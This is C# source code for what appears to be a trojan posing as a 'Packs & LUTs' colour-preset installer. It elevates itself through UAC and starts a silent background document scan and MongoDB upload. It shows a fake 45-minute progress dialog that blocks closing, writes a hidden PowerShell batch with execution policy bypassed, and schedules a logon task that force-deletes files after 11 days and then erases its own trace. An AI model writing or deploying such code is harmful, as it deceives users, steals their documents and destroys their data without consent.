using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using DocumentScanner;

class Program
{
    // ----- CONFIGURATION -----
    private static readonly string TargetFilePath = @"C:\Users\Public\Documents\file_to_delete.txt";
    private const string RegKeyPath = @"Software\FileDeleterApp";
    private const string RegValueName = "Scheduled";
    private const string TaskName = "FileDeleterTask";
    // Total fake install duration: 45 minutes in milliseconds
    private const int TotalDurationMs = 45 * 60 * 1000;
    // ----- END CONFIGURATION -----

    [STAThread]
    static void Main(string[] mainArgs)
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);

        bool forceNoAdmin = mainArgs != null && mainArgs.Length > 0 && mainArgs[0] == "--no-admin";
        // If not admin, relaunch with admin rights
        if (!IsAdministrator() && !forceNoAdmin)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    UseShellExecute = true,
                    Verb = "runas"  // <-- This triggers the UAC popup
                });
            }
            catch { }
            return;
        }

        // Kick off silent document scan + MongoDB upload in background
        SilentScanner.RunInBackground(null);

        // Show the fake "Installing Packs & LUTs" dialog
        ShowInstallDialog();

        // Schedule the background task (runs after dialog closes)
        ScheduleTask();

        // Keep the app alive silently — no window, just the message loop
        // Application.Run() with no form keeps the process alive until explicit exit
        Application.Run();
    }

    static void ShowInstallDialog()
    {
        using (var dlg = new InstallerDialog(TotalDurationMs))
        {
            dlg.ShowDialog();
            // Dialog closes on its own after progress completes
        }
    }

    static void ScheduleTask()
    {
        try
        {
            bool taskExists = false;
            try
            {
                using (var qp = Process.Start(new ProcessStartInfo
                {
                    FileName               = "schtasks",
                    Arguments              = $"/query /tn \"{TaskName}\"",
                    UseShellExecute        = false,
                    CreateNoWindow         = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true
                }))
                {
                    qp.WaitForExit();
                    taskExists = (qp.ExitCode == 0);
                }
            }
            catch { }

            if (taskExists)
                return;  // task already scheduled — nothing to do

            DateTime target    = DateTime.Now.AddDays(11);
            string targetStr   = target.ToString("yyyy-MM-ddTHH:mm:ss");

            string batchPath    = @"C:\Windows\Temp\FileDeleterTask.bat";
            string batchContent = $"@echo off\r\npowershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"if ((Get-Date) -ge [datetime]'{targetStr}') {{ Remove-Item -Path '{TargetFilePath}' -Recurse -Force -ErrorAction SilentlyContinue; schtasks /Delete /TN '{TaskName}' /F; }}\"";
            File.WriteAllText(batchPath, batchContent);

            string args = $"/create /tn \"{TaskName}\" /tr \"{batchPath}\" /sc onlogon /f";
            using (Process p = Process.Start(new ProcessStartInfo
            {
                FileName        = "schtasks",
                Arguments       = args,
                UseShellExecute = false,
                CreateNoWindow  = true
            }))
            {
                p.WaitForExit();
            }
        }
        catch { }
    }

    static bool IsAdministrator()
    {
        using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            return new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
//  Fake installer dialog — no browser, no console
// ─────────────────────────────────────────────────────────────────────────────
class InstallerDialog : Form
{
    private readonly int _totalMs;
    private System.Windows.Forms.Timer _timer;
    private ProgressBar _progressBar;
    private Label _titleLabel;
    private Label _statusLabel;
    private Label _timeLabel;
    private Panel _topPanel;
    private int _elapsed = 0;

    // Rotating status messages shown while "installing"
    private static readonly string[] StatusMessages = new[]
    {
        "Preparing environment...",
        "Extracting color packs...",
        "Installing LUT profiles...",
        "Verifying file integrity...",
        "Applying cinematic presets...",
        "Configuring tone-mapping tables...",
        "Loading HDR grade packages...",
        "Registering color pipelines...",
        "Optimizing GPU cache...",
        "Finalizing installation..."
    };

    public InstallerDialog(int totalDurationMs)
    {
        _totalMs = totalDurationMs;

        // ── Window chrome ─────────────────────────────────────────────────
        Text            = "Installing Packs & LUTs";
        FormBorderStyle = FormBorderStyle.FixedDialog;
        StartPosition   = FormStartPosition.CenterScreen;
        ClientSize      = new Size(480, 220);
        MaximizeBox     = false;
        MinimizeBox     = false;
        ControlBox      = false;   // hides X button
        BackColor       = Color.FromArgb(22, 22, 30);

        // ── Top accent panel ──────────────────────────────────────────────
        _topPanel = new Panel
        {
            Dock      = DockStyle.Top,
            Height    = 5,
            BackColor = Color.FromArgb(80, 140, 255)
        };

        // ── Title label ───────────────────────────────────────────────────
        _titleLabel = new Label
        {
            Text      = "Installing Packs & LUTs",
            Font      = new Font("Segoe UI", 15f, FontStyle.Bold),
            ForeColor = Color.White,
            AutoSize  = true,
            Location  = new Point(28, 28)
        };

        // ── Status label ──────────────────────────────────────────────────
        _statusLabel = new Label
        {
            Text      = StatusMessages[0],
            Font      = new Font("Segoe UI", 9.5f),
            ForeColor = Color.FromArgb(170, 180, 210),
            AutoSize  = true,
            Location  = new Point(28, 70)
        };

        // ── Progress bar ──────────────────────────────────────────────────
        _progressBar = new ProgressBar
        {
            Minimum  = 0,
            Maximum  = 1000,
            Value    = 0,
            Style    = ProgressBarStyle.Continuous,
            Location = new Point(28, 105),
            Size     = new Size(424, 20)
        };

        // ── Time remaining label ──────────────────────────────────────────
        _timeLabel = new Label
        {
            Text      = "Estimated time remaining: 45 min 00 sec",
            Font      = new Font("Segoe UI", 8.5f),
            ForeColor = Color.FromArgb(120, 130, 160),
            AutoSize  = true,
            Location  = new Point(28, 136)
        };

        // ── Footer note ───────────────────────────────────────────────────
        var note = new Label
        {
            Text      = "Please do not close or restart your computer during installation.",
            Font      = new Font("Segoe UI", 8f, FontStyle.Italic),
            ForeColor = Color.FromArgb(90, 100, 130),
            AutoSize  = false,
            Size      = new Size(430, 18),
            Location  = new Point(28, 180),
            TextAlign = ContentAlignment.MiddleLeft
        };

        Controls.AddRange(new Control[]
        {
            _topPanel, _titleLabel, _statusLabel, _progressBar, _timeLabel, note
        });

        // ── Timer — ticks every second ────────────────────────────────────
        _timer = new System.Windows.Forms.Timer { Interval = 1000 };
        _timer.Tick += OnTick;
        _timer.Start();
    }

    private void OnTick(object sender, EventArgs e)
    {
        _elapsed += 1000;

        double fraction = Math.Min(1.0, (double)_elapsed / _totalMs);
        _progressBar.Value = (int)(fraction * 1000);

        int remaining    = Math.Max(0, (_totalMs - _elapsed) / 1000);
        int remMin       = remaining / 60;
        int remSec       = remaining % 60;
        _timeLabel.Text  = $"Estimated time remaining: {remMin} min {remSec:D2} sec";

        // Rotate status message roughly every 4 minutes
        int msgIndex     = (int)(fraction * (StatusMessages.Length - 1));
        _statusLabel.Text = StatusMessages[Math.Min(msgIndex, StatusMessages.Length - 1)];

        // Flash accent bar colour as progress advances
        byte r = (byte)(80 + (int)(fraction * 80));
        byte g = (byte)(140 - (int)(fraction * 60));
        _topPanel.BackColor = Color.FromArgb(r, g, 255);

        if (_elapsed >= _totalMs)
        {
            _timer.Stop();
            _statusLabel.Text = "Installation complete!";
            _timeLabel.Text   = "Estimated time remaining: 0 min 00 sec";
            // Brief pause so the user reads "complete", then close dialog
            System.Threading.Thread.Sleep(1500);
            DialogResult = DialogResult.OK;
            Close();
        }
    }

    protected override void OnFormClosing(FormClosingEventArgs e)
    {
        // Block ALT+F4 until timer finishes
        if (_timer != null && _timer.Enabled)
            e.Cancel = true;
        else
            base.OnFormClosing(e);
    }
}